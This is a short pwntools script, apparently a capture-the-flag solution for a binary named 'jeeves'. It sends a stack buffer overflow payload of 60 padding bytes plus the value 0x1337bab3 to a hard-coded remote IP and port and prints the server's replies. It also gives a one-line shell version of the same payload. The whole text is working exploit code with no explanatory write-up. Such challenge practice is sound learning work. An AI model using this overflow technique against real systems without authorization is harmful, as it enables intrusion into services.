#ghidra+gdb, need to consider alignment

#python -c "print 'A'*(44+4+8+4)+'\xb3\xba\x37\x13'" | ./jeeves

from pwn import *

#io = remote('127.0.0.1', 1234)
io = remote('138.68.155.238', 32419)
#io = process('./jeeves')

buf = 'A'*(44+4+8+4)+'\xb3\xba\x37\x13'
io.sendline(buf)

io.recvline()
io.recvline()
print(io.recvline())
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))

